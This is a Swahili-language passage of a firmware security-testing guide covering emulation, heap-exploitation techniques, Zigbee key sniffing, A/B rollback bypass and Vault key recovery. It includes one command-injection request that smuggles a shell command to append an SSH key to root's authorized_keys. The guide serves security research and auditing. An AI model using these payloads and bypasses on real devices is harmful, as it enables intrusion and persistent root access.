Zana kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) na nyinginezo hurahisisha uigaji kamili wa firmware, kwa kujiendeshea mchakato na kusaidia uchanganuzi wa nguvu.

### Kujenga upya mifumo ya faili ya root iliyogawanywa na kuthibitishwa kwa ajili ya uigaji

Ikiwa superblock ya SquashFS inaweza kusomeka lakini offsets za inode, directory au fragment-table haziwezekani, usifanye marekebisho kwa `unsquashfs` mara moja. Reverse engineer binary ya early boot na uzalishe upya grafu ya block-device inayoundwa nayo: mifumo iliyopachikwa inaweza kuonyesha partition ya root ya kawaida lakini ikaunda mfumo halisi wa faili kwa kutumia mapping ya `dm-linear` inayoongeza sectors zilizokopwa kutoka partition nyingine. Ukaguzi wa superblock pekee unaweza kufanikiwa hata kama kila block ya metadata inayofuata imehamishwa.<sup>[[11]](#references)</sup>

Hifadhi hesabu za firmware kama zilivyo. Hasa, tambua ikiwa urefu umeonyeshwa kwa bytes, sectors za 512-byte au kurasa za 4 KiB; zalisha upya shifts na truncation kwa mpangilio wake wa awali; na zingatia maeneo ya mwisho yanayotegemea bank katika mipangilio ya A/B. Kwa mfano, `(partition_bytes >> 12) << 3` kwanza hukata hadi mpaka wa 4 KiB, kisha huonyesha matokeo kwa sectors za 512-byte; kuibadilisha na `partition_bytes // 512` kunaweza kusogeza eneo lililoongezwa kwa kilobytes chache na kuharibu jedwali zote za SquashFS zinazofuata.<sup>[[11]](#references)</sup>

Mtiririko mzuri wa kazi wa uthibitishaji ni:<sup>[[11]](#references)</sup>

1. Pata segmenti za kila `dm-linear` pamoja na source device, start sector na urefu wake kutoka kwenye binary ya verifier/init.
2. Unganisha au mapua extents bila kubadilisha semantiki zake za alignment.
3. Ikiwa uchimbaji bado unashindwa, tafuta ndani ya eneo dogo tu karibu na mpaka uliokadiriwa, na uhakikishe kuna miundo kadhaa halali ya metadata mfululizo badala ya kukubali superblock inayoonekana kuwa sawa pekee.
4. Endesha `unsquashfs` ambayo haijafanyiwa marekebisho dhidi ya image iliyojengwa upya; kufanikiwa kupitia directory na fragment zote ni ushahidi thabiti zaidi kuliko `unsquashfs -stat`.

#### Ubadilishaji wa dm-verity unaodhibitiwa na mchambuzi

Mchambuzi anapodhibiti kernel ya QEMU, initramfs na diski pepe, root iliyorekebishwa inaweza kuwashwa kwa kubadilisha PID 1 ya uthibitishaji ya mtengenezaji na init ndogo iliyounganishwa kwa statically. Huu ni **lab boot-chain substitution**, si kuvunja dm-verity, saini yake ya RSA, Secure Boot au ufunguo uliofungwa kwenye TPM.<sup>[[11]](#references)</sup>

Init mbadala inapaswa kuiga sehemu za kiutendaji za njia ya awali ya boot: mount `devtmpfs`, ita `setsid()`, unganisha `/dev/console` na file descriptor 0–2, mount `/proc` na `/sys`, subiri kifaa cha block kilichotolewa, mount root iliyohaririwa iwe ya kusoma pekee, detach pseudo-filesystem za old-root, hamisha mount mpya juu ya `/`, tekeleza `chroot`, kisha tekeleza `execve()` ya `/sbin/init` asilia ya firmware. Kutenganisha `/dev`, `/proc` na `/sys` **kabla** ya `MS_MOVE` huepusha kutenganisha kwa bahati mbaya mount point za root mpya.<sup>[[11]](#references)</sup>

Weka hali ya kifaa inayoweza kubadilika tofauti na root isiyobadilika iliyorekebishwa. Overlay ya qcow2 inaweza kuhifadhi hali ya LVM ya diski asilia, huku diski ya pili ya virtio ya kusoma pekee ikitoa SquashFS iliyohaririwa:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Utatuzi wa hitilafu za hali ya image ukiwa nje ya mtandao

Kagua hali endelevu nje ya guest wakati kuwaka kwa polepole, scripts za kuanzisha zinazoharibu, au logging ya console isiyotegemewa kunaficha hitilafu. Usiambatishe kamwe overlay inayotumiwa na VM inayoendelea kufanya kazi; ifanye ipatikane kupitia `qemu-nbd`, zuia ugunduzi wa LVM kwenye partition ya NBD iliyokusudiwa, na uzime volume group kabla ya kukata muunganisho wake.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Kwa utengaji wa hitilafu unaoweza kurudiwa, andika faili za alama zenye mihuri ya muda kwenye volume thabiti inayoweza kuandikiwa na uzihakiki ukiwa offline; `/dev/kmsg`, FIFO na konsoli za muda zinaweza kusababisha matokeo hasi ya uongo kwa sababu ya udhibiti wa kasi au mchakato kufa mapema. Pia linganisha interfaces halisi katika tabaka zote kabla ya kubadilisha msimbo usiohusiana: `uname -r` dhidi ya `/lib/modules/`, vipengele vya ext4 vilivyo kwenye diski dhidi ya usanidi wa kernel, na kizazi cha Mesa `libGL` dhidi ya ABI ya kiendeshi cha DRI na majina ya viendeshi yanayotokana na PCI. Kipengele kinaweza kuwepo na hata `dlopen()` kufanya kazi kwa mafanikio, lakini bado kisiweze kutumika kwa sababu sehemu inayokitumia inatarajia ABI tofauti.<sup>[[11]](#references)</sup>

## Dynamic Analysis kwa Vitendo

Katika hatua hii, mazingira ya kifaa halisi au kilichoigwa hutumika kufanya uchanganuzi. Ni muhimu kudumisha ufikiaji wa shell kwenye OS na mfumo wa faili. Uigaji huenda usifanane kikamilifu na mwingiliano wa maunzi, hivyo huenda ikahitajika kuanzisha upya uigaji mara kwa mara. Uchanganuzi unapaswa kukagua tena mfumo wa faili, kutumia vibaya kurasa za wavuti na huduma za mtandao zilizo wazi, na kuchunguza udhaifu wa bootloader. Majaribio ya uadilifu wa firmware ni muhimu ili kubaini udhaifu unaoweza kusababishwa na backdoor.

## Mbinu za Runtime Analysis

Runtime analysis huhusisha kuingiliana na mchakato au binary katika mazingira yake ya uendeshaji, kwa kutumia zana kama gdb-multiarch, Frida na Ghidra kuweka breakpoints na kutambua udhaifu kupitia fuzzing na mbinu nyingine.

Kwa targets zilizopachikwa zisizo na debugger kamili, **nakili `gdbserver` iliyounganishwa tuli** kwenye kifaa na uunganishe nayo kwa mbali:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Upangaji wa ujumbe wa Zigbee / radio-co-processor

Kwenye hub za IoT, RF stack mara nyingi hugawanywa kati ya **radio MCU** na mchakato wa Linux userland. Njia muhimu ya kufuatilia ni:<sup>[[8]](#references)</sup>

1. **RF frame** hewani
2. **controller-side parser** kwenye radio MCU
3. **serial/UART text au TLV protocol** inayotumwa kwa Linux (kwa mfano `/dev/tty*`)
4. **application dispatcher** kwenye daemon kuu
5. **protocol-specific handler / state machine**

Muundo huu huunda maeneo mawili ya kufanya reversing badala ya moja. Ikiwa controller inabadilisha binary radio frames kuwa protocol ya maandishi kama `Group,Command,arg1,arg2,...`, tafuta:

- **message groups** na dispatch tables
- Ujumbe gani unaweza kutoka **network** dhidi ya kutoka kwa controller yenyewe
- Sehemu halisi za **manufacturer-specific discriminator** (kwa mfano Zigbee `manufacturer_code` na custom `cluster_command`)
- Ni handlers zipi zinazoweza kufikiwa tu wakati wa **commissioning**, discovery, au awamu za upakuaji wa firmware/model

Kwa Zigbee hasa, nasa pairing traffic na uangalie kama kifaa bado kinatumia **Link Key** ya chaguo-msingi `ZigBeeAlliance09`. Ikiwa ndivyo, kunusa commissioning traffic kunaweza kufichua **Network Key**. Zigbee 3.0 install codes hupunguza hatari hii, kwa hiyo bainisha kama kifaa kilichojaribiwa kinazitekeleza kweli.

### Manufacturer-specific protocol handlers na ufikikaji unaodhibitiwa na FSM

Amri za Zigbee/ZCL za vendor-specific mara nyingi huwa lengo bora kuliko clusters zilizosanifishwa kwa sababu hutumia **custom parsing code** na **FSMs** za ndani zenye validation ambayo haijajaribiwa sana.<sup>[[8]](#references)</sup>

Mtiririko wa kazi wa vitendo:

- Fanya reverse ya command dispatcher hadi upate **vendor-only handler**.
- Pata jedwali za **FSM state**, **event**, **check**, **action**, na **next-state**.
- Tambua **transitional states** zinazoendelea zenyewe, pamoja na matawi ya retry/error ambayo hatimaye huweka upya au kuachilia state inayodhibitiwa na mshambuliaji.
- Thibitisha ni mabadilishano gani halali ya protocol yanayohitajika ili kuiweka daemon kwenye hali iliyo hatarini, badala ya kudhani handler yenye hitilafu inaweza kufikiwa kila wakati.

Kwa protocol zinazohitaji muda sahihi, packet replay kutoka Python framework inaweza kuwa polepole mno. Njia ya kuaminika zaidi ni kuiga kifaa halali kwenye hardware halisi (kwa mfano **nRF52840**) kwa kutumia stack ya kiwango cha vendor ili uweze kufichua **endpoints**, **attributes**, na muda sahihi wa commissioning.

### Aina ya hitilafu ya upakuaji uliogawanywa vipande kwenye embedded daemons

Aina ya hitilafu ya firmware inayojirudia hutokea kwenye upakuaji uliogawanywa vipande wa **blob/model/configuration**:<sup>[[8]](#references)</sup>

1. **First fragment** (`offset == 0`) huhifadhi `ctx->total_size` na kutenga `malloc(total_size)`.
2. Fragments zinazofuata hukagua tu sehemu za **packet-local** zinazodhibitiwa na mshambuliaji, kama vile `packet_total_size >= offset + chunk_len`.
3. Nakala hutumia `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bila kukagua dhidi ya **original allocated size**.

Hii humwezesha mshambuliaji kutuma:

- First fragment halali yenye total size iliyotangazwa kuwa **ndogo** ili kulazimisha ugawaji mdogo wa heap.
- Fragment ya baadaye yenye **expected offset** lakini `chunk_len` kubwa zaidi.
- Packet-local size ya kughushi inayotimiza ukaguzi mpya huku bado ikifurika buffer iliyotengwa awali.

Wakati njia iliyo hatarini iko nyuma ya commissioning logic, exploitation lazima ijumuisha **device emulation** ya kutosha ili kuifikisha target kwenye hali inayotarajiwa ya model-download au blob-download kabla ya kutuma fragments zenye hitilafu.

### Vichochezi vya `free()` vinavyoendeshwa na protocol

Kwenye embedded daemons, njia rahisi zaidi ya kuchochea heap metadata exploitation mara nyingi si "kusubiri usafishaji" bali **kulazimisha error handling ya protocol yenyewe**:<sup>[[8]](#references)</sup>

- Tuma follow-up fragments zenye hitilafu ili kusukuma FSM kwenye hali za **retry** au **error**.
- Vuka kiwango cha juu cha retries ili daemon **iweke upya context** na kuachilia buffer iliyoharibiwa.
- Tumia `free()` hii inayotabirika kuchochea allocator-side primitives kabla mchakato hauja-crash kwa sababu zisizohusiana.

Hii ni muhimu hasa dhidi ya allocators zinazofanana na **musl/uClibc/dlmalloc** kwenye embedded Linux, ambapo kuharibu chunk metadata kunaweza kubadilisha unlink/unbin logic kuwa write primitive. Mbinu thabiti ni kuharibu **size field** ili kuelekeza allocator traversal kwenye **fake chunks zilizowekwa ndani ya buffer iliyofurika**, badala ya kuharibu mara moja bin pointers halisi na ku-crash mchakato.

## Binary Exploitation and Proof-of-Concept

Kutengeneza PoC ya vulnerabilities zilizotambuliwa kunahitaji uelewa wa kina wa target architecture na programu katika lugha za kiwango cha chini. Binary runtime protections ni nadra kwenye embedded systems, lakini zinapokuwepo, mbinu kama Return Oriented Programming (ROP) zinaweza kuhitajika.

### Vidokezo vya u-exploit wa uClibc fastbin (embedded Linux)

- **Fastbins + consolidation:** uClibc hutumia fastbins zinazofanana na za glibc. Ugawaji mkubwa wa baadaye unaweza kuchochea `__malloc_consolidate()`, kwa hiyo fake chunk yoyote lazima ipite ukaguzi (size inayokubalika, `fd = 0`, na chunks zinazoizunguka kuonekana kama "in use").<sup>[[6]](#references)</sup>
- **Binaries zisizo za PIE chini ya ASLR:** ikiwa ASLR imewashwa lakini binary kuu ni **non-PIE**, anwani za `.data/.bss` ndani ya binary hazibadiliki. Unaweza kulenga eneo ambalo tayari linafanana na heap chunk header halali ili kufanya fastbin allocation iishie kwenye **function pointer table**.
- **NUL inayosimamisha parser:** JSON inapochanganuliwa, `\x00` ndani ya payload inaweza kusimamisha uchanganuzi huku ikiweka bytes za mshambuliaji zilizo nyuma yake kwa stack pivot/ROP chain.
- **Shellcode kupitia `/proc/self/mem`:** ROP chain inayopiga `open("/proc/self/mem")`, `lseek()`, na `write()` inaweza kuweka shellcode inayoweza kutekelezwa kwenye mapping inayojulikana na kisha kurukia humo.

## Mifumo ya uendeshaji iliyoandaliwa kwa Uchambuzi wa Firmware

Mifumo ya uendeshaji kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira yaliyosanidiwa awali kwa ajili ya kupima usalama wa firmware, yakiwa na zana zinazohitajika.

## OS zilizoandaliwa kwa ajili ya kuchambua Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyokusudiwa kukusaidia kufanya tathmini ya usalama na penetration testing ya vifaa vya Internet of Things (IoT). Huokoa muda mwingi kwa kutoa mazingira yaliyosanidiwa awali yenye zana zote zinazohitajika tayari zimewekwa.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Mfumo wa uendeshaji wa kupima embedded security, unaotegemea Ubuntu 18.04 na ukiwa na zana za kupima usalama wa firmware zilizowekwa awali.

## Mashambulizi ya Firmware Downgrade na Mbinu za Kusasisha Zisizo Salama

Hata vendor anapotekeleza ukaguzi wa saini za cryptographic kwa firmware images, ulinzi dhidi ya kurudisha toleo nyuma (downgrade) mara nyingi hukosekana. Boot- au recovery-loader inapothibitisha tu saini kwa public key iliyopachikwa lakini hailinganishi *version* (au monotonic counter) ya image inayowekwa, mshambuliaji anaweza kusakinisha kihalali **firmware ya zamani iliyo hatarini ambayo bado ina saini halali**, na hivyo kurudisha vulnerabilities zilizorekebishwa.<sup>[[4]](#references)</sup>

Mtiririko wa kawaida wa shambulio:

1. **Pata image ya zamani yenye saini**
   * Ichukue kutoka kwenye tovuti ya umma ya upakuaji ya vendor, CDN au support site.
   * Itangue kutoka kwenye companion mobile/desktop applications (kwa mfano ndani ya Android APK chini ya `assets/firmware/`).
   * Iipate kutoka kwenye third-party repositories kama VirusTotal, Internet archives, forums, n.k.
2. **Pakia au toa image kwa kifaa** kupitia update channel yoyote iliyo wazi:
   * Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
   * Vifaa vingi vya IoT vya watumiaji vina HTTP(S) endpoints *zisizohitaji uthibitishaji* zinazokubali firmware blobs zilizowekwa kwenye Base64, kuzifungua upande wa server na kuanzisha recovery/upgrade.
3. Baada ya downgrade, exploit vulnerability iliyorekebishwa kwenye toleo jipya zaidi (kwa mfano command-injection filter iliyoongezwa baadaye).
4. Kwa hiari, flash image ya hivi karibuni tena au zima updates ili kuepuka kugunduliwa baada ya kupata persistence.

### Mfano: Command Injection Baada ya Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Katika firmware iliyo hatarini (iliyoshushwa hadi toleo la zamani), parameter ya `md5` inaunganishwa moja kwa moja kwenye amri ya shell bila kusafishwa, hivyo kuruhusu injection ya amri zozote (hapa — kuwezesha ufikiaji wa root kwa kutumia SSH key). Matoleo ya baadaye ya firmware yaliongeza kichujio cha msingi cha herufi, lakini kutokuwepo kwa ulinzi dhidi ya downgrade kunafanya marekebisho hayo yasiwe na maana.<sup>[[4]](#references)</sup>

### Kutoa Firmware Kutoka kwa Programu za Simu

Wauzaji wengi hujumuisha picha kamili za firmware ndani ya programu zao za simu zinazotumika pamoja na kifaa, ili programu iweze kukisasisha kupitia Bluetooth/Wi-Fi. Vifurushi hivi mara nyingi huhifadhiwa bila usimbaji fiche ndani ya APK/APEX, katika njia kama `assets/fw/` au `res/raw/`. Zana kama `apktool`, `ghidra`, au hata `unzip` ya kawaida hukuwezesha kutoa picha zilizotiwa saini bila kugusa maunzi halisi.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Kupita ulinzi wa anti-rollback unaotekelezwa na updater pekee katika miundo ya slot za A/B

Baadhi ya vendor hutekeleza **ratchet** ya kuzuia downgrade, lakini kwenye mantiki ya *updater* pekee (kwa mfano, routine ya UDS kupitia CAN, amri ya recovery, au wakala wa OTA wa userspace). Ikiwa **bootloader** baadaye hukagua tu saini/CRC ya image na kuamini jedwali la partition au metadata ya slot, ulinzi wa rollback bado unaweza kupitwa.<sup>[[7]](#references)</sup>

Muundo dhaifu wa kawaida:

- Metadata ya firmware ina maelezo ya toleo na **security ratchet** / counter inayoongezeka tu.
- Updater hulinganisha ratchet ya image na thamani iliyohifadhiwa kwenye storage endelevu na kukataa image za zamani zilizosainiwa.
- **Bootloader** haichanganui ratchet hiyo na huthibitisha tu header, CRC, na saini kabla ya kuwasha slot iliyochaguliwa.
- Uamilishaji wa slot huhifadhiwa kando kwenye jedwali la partition au counter ya generation ya kila slot na **haujaunganishwa kwa njia ya kriptografia** na digest halisi ya firmware iliyothibitishwa.

Hii hutengeneza primitive ya **thibitisha-image-moja / washa-image-nyingine** katika mifumo yenye slot mbili. Ikiwa mshambuliaji anaweza kuifanya updater iashirie slot B kuwa lengo la kuwasha linalofuata kwa kutumia image ya sasa iliyosainiwa, kisha baadaye aandike upya slot B kabla ya kuwasha upya, bootloader bado inaweza kuwasha image iliyoshushwa toleo kwa sababu inaamini tu metadata ya slot iliyokwishawekwa.

Mfumo wa kawaida wa matumizi mabaya:

1. Pakia firmware **ya sasa iliyosainiwa** kwenye slot tulivu na utekeleze routine ya kawaida ya uthibitishaji/kubadilisha slot ili mpangilio uashirie slot hiyo kuwa inayofuata kuwa amilifu.
2. **Usiwasha upya bado**. Ingia tena kwenye routine ya kuandaa/kufuta slot katika kipindi hicho hicho.
3. Tumia vibaya hali ya kuwasha iliyopitwa na wakati au mantiki ya kuchagua slot iliyopitwa na wakati ili updater ifute **slot ileile halisi** iliyopandishwa muda mfupi uliopita.
4. Andika firmware **ya zamani lakini bado iliyosainiwa** kwenye slot hiyo.
5. Ruka routine ya uthibitishaji inayotekeleza ratchet na uwashe upya moja kwa moja.
6. Bootloader huchagua slot iliyopandishwa, hukagua saini/uadilifu pekee, kisha huwasha image ya zamani.

Mambo ya kuangalia unapofanya reverse engineering ya utekelezaji wa masasisho ya A/B:

- Uchaguzi wa slot unatokana na **bendera za wakati wa kuwasha** ambazo hazisasishwi baada ya kubadilisha slot kwa mafanikio.
- Routine ya aina ya `prepare_passive_slot()` inayofuta slot kwa kutumia hali iliyopitwa na wakati badala ya **mpangilio wa sasa uliothibitishwa**.
- Function ya aina ya `part_write_layout()` inayoongeza tu **generation counter** / bendera amilifu na haihifadhi hash ya image iliyothibitishwa.
- Ukaguzi wa ratchet unatekelezwa kwenye userspace au msimbo wa updater, lakini **si** kwenye hatua za ROM / bootloader / secure boot.
- Routine za kufuta au recovery zinazoacha slot ikiwa imewekewa alama ya kuwashika hata baada ya maudhui yake kufutwa na kuandikwa upya.

### Orodha ya Kukagua Mantiki ya Usasishaji

* Je, usafirishaji/uthibitishaji wa *endpoint ya update* umelindwa vya kutosha (TLS + uthibitishaji)?
* Je, kifaa hulinganisha **nambari za toleo** au **counter ya anti-rollback inayoongezeka tu** kabla ya ku-flash?
* Je, image inathibitishwa ndani ya secure boot chain (kwa mfano, saini hukaguliwa na msimbo wa ROM)?
* Je, **bootloader hutekeleza ratchet ileile** kama updater, badala ya kukagua saini/CRC pekee?
* Je, metadata ya uamilishaji wa slot **imeunganishwa na digest/toleo la firmware lililothibitishwa**, au slot inaweza kurekebishwa baada ya kupandishwa?
* Baada ya kubadilisha slot kwa mafanikio, je, kifaa hulazimishwa kuwasha upya au routine za baadaye za kusasisha/kufuta bado zinaweza kufikiwa katika kipindi hicho hicho?
* Je, msimbo wa userland hufanya ukaguzi wa ziada wa usahihi (kwa mfano, ramani ya partition zinazoruhusiwa, nambari ya modeli)?
* Je, mtiririko wa masasisho wa *sehemu* au wa *backup* hutumia tena mantiki ileile ya uthibitishaji?

> 💡  Ikiwa lolote kati ya yaliyo hapo juu halipo, huenda mfumo uko hatarini kwa mashambulizi ya rollback.

## Firmware dhaifu ya kufanyia mazoezi

Ili kufanya mazoezi ya kugundua udhaifu kwenye firmware, tumia miradi ifuatayo ya firmware dhaifu kama mwanzo.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Kurejesha funguo za kusimbua firmware kutoka kwenye hali ya KMS/Vault iliyopachikwa

Image ya update inapochanganya metadata ndogo iliyo katika maandishi wazi na blob kubwa yenye entropy ya juu, kagua kontena kabla ya kujaribu brute-force:<sup>[[1]](#references)</sup>

- Tupa headers, offsets na mipaka ya mistari kwa kutumia `hexdump`, `xxd`, `strings -tx`, `base64 -d`, na `binwalk -E`.
- `Salted__` kwa kawaida humaanisha umbizo la OpenSSL `enc`: baiti 8 zinazofuata ni salt na baiti zilizobaki ni ciphertext.
- Sehemu ya Base64 inayosimbuliwa na kuwa baiti `256` kamili ni kidokezo kikubwa kwamba unatazama ciphertext ya RSA-2048 inayofunga nenosiri/funguo ya session ya firmware iliyozalishwa bila mpangilio.
- Nyenzo ya PGP iliyotenganishwa iliyo kwenye faili hiyohiyo mara nyingi hulinda uhalisi pekee; usidhani ndiyo njia ya kuweka usiri.

Ikiwa kutafuta funguo tuli (`grep`, `strings`, utafutaji wa PEM/PGP) hakufanikiwa, fanya reverse engineering ya **njia ya usimbuaji inayotumika** badala ya kutafuta funguo za faragha pekee:

- Decompile binary ya updater / management na ufuatilie ni nani anayesoma blob iliyosimbwa, helper/API gani inayoifungua, na jina gani la kimantiki la ufunguo inayoiomba.
- Tafuta hali ya KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) pamoja na unit files na init scripts kwenye root filesystem iliyotolewa.
- Chukulia amri za maandishi wazi za `vault operator unseal ...`, funguo za recovery, bootstrap tokens, au scripts za ndani za KMS auto-unseal kuwa sawa na nyenzo za funguo za faragha.

Ikiwa appliance ina binary asili ya Vault na storage backend, kuendesha tena mazingira hayo huwa rahisi kuliko kutekeleza upya mambo ya ndani ya Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Ukiwa na root kwenye KMS iliyoklonwa:

- Fanya transit keys ziweze kuhamishwa nje ndani ya clone iliyotengwa pekee: `vault write transit/keys/<name>/config exportable=true`
- Hamisha unwrap key: `vault read transit/export/encryption-key/<name>`
- Jaribu RSA key iliyorejeshwa ukitumia jozi halisi ya padding/hash inayotumiwa na KMS. Kushindwa kwa decryption ya PKCS#1 v1.5 na kwa OAEP ya kawaida **hakuthibitishi** kuwa key si sahihi; mifumo mingi inayotumia Vault hutumia OAEP yenye SHA-256, ilhali maktaba za kawaida hutumia SHA-1 kama chaguomsingi.
- Ikiwa payload inaanza na `Salted__`, fuatisha KDF ya OpenSSL ya mtengenezaji jinsi ilivyo hasa (`EVP_BytesToKey`, mara nyingi MD5 kwenye vifaa vya zamani) kabla ya kujaribu decryption ya AES-CBC.

Hii inabadilisha tatizo la "firmware iliyosimbwa kwa njia fiche" kuwa tatizo la jumla zaidi: **rejesha operational keys za upande wa appliance, kisha fuatisha offline vigezo halisi vya unwrap + KDF**.

## Mafunzo na Vyeti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Kuvunja Usimbaji wa Firmware kwa Claude: Ujuzi wa Kiwango cha Mtaalamu, Uhuru wa Kiwango cha Mwanzilishi](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Mbinu ya Kupima Usalama wa Firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Udukuzi wa IoT kwa Vitendo: Mwongozo Kamili wa Kushambulia Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Kutumia zero-days kwenye vifaa vilivyoachwa — blogu ya Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jinsi Kifaa Mahiri cha $20 Kilivyonipa Ufikiaji wa Nyumba Yako](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sasa Unamwona mi: Sasa Umepwniwa](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Kutumia Tesla Wall Connector kupitia kiunganishi chake cha chaji - Sehemu ya 2: kukwepa uzuiaji wa downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Ifanye Iwake: Kutumia Philips Hue Bridge kupitia Over-the-Air](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS kwenye QEMU Sehemu ya 1: Kufungua kifurushi](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Nyaraka za Linux kernel - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS kwenye QEMU Sehemu ya 2: Kutatua hitilafu na kurekebisha](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Nywila za Dell BIOS: Usimbaji hafifu wa XOR unaruhusu kurejesha kutoka SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Zana za kurejesha nywila za Dell BIOS](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Kukumbushia Udukuzi wa Vifaa, Sehemu ya 2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Jinsi na Kwa Nini Tulidukua Wallet ya Vifaa ya Cypherock: Hadithi Kamili](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
